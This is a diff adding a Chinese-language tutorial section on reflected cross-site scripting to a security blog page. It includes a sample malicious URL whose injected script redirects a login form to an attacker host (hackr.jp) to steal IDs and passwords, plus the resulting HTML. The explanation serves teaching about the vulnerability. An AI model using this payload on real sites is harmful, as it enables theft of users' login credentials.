@@ -71,8 +71,30 @@
     
         <p>跨站脚本攻击(XSS)指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或js进行的一种攻击。动态创建的HTML部分有可能隐藏安全漏洞，这样攻击者写脚本设下陷阱，用户在自己的浏览器上运行时，不小心就会受到被动攻击。跨站脚本攻击可能有的影响：利用虚假输入表单骗取个人信息；利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击这发送恶意请求，显示伪造的文章或图片。</p>
         
-        <p></p>
-        
+        <p>一些案例.在动态生成HTML处发生：填写用户输入的个人信息内容表单时，如果允许输入HTML标签，浏览器会把用户输入的&lt;s&gt; 解析成HTML 标签，然后显示删除线。删除线显示出来并不会造成太大的不利后果，但如果换成使用script 标签将会如何呢。</p>
+        <p>XSS 是攻击者利用预先设置的陷阱触发的被动攻击.跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。网站可以通过地址栏中URI 的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。</p>
+        <p>充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web 页面内，诱使用户去点击该URL。</p>
+        <pre>http://example.jp/login?ID="&lt;&gt;script&gt;var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";&lt;/script&gt;&lt;span+s="</pre>
+        <p>浏览器打开该URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID和密码之后，就会直接发送到攻击者的网站（也就是hackr.jp），导致个人登录信息被窃取。之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
+        <p>ID='yama'的代码</p>
+        <pre>
+          &lt;div class="logo"&gt;
+            &lt;img src="/img/logo.gif" alt="E! 拍卖会" /&gt;
+            &lt;/div&gt;&lt;form action="http://example.jp/login" method="post" id="login"&gt;
+            &lt;div class="input_id"&gt;ID &lt;input type="text" name="ID" value="yama" /&gt;
+          &lt;/div&gt;
+        </pre>
+        <p>ID="&lt;&gt;script&gt;var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";&lt;/script&gt;&lt;span+s="的代码：</p>
+        <pre>
+          &lt;div class="logo"&gt;
+            &lt;img src="/img/logo.gif" alt="E! 拍卖会 /&gt;
+            &lt;/div&gt;&lt;form action="http://example.jp/login" method="post" id="login"&gt;
+            &lt;div class="input_id"&gt;ID &lt;input type="text" name="ID" value=""&gt;
+            &lt;script&gt;var f=document.getElementById("login");f.action="http://hackr.jp/pwget"; f.method="get";
+            &lt;/script&gt;
+            &lt;span s="" /&gt;
+          &lt;/div&gt;
+        </pre>
         
 <h3>标签</h3>
 <p>security</p>
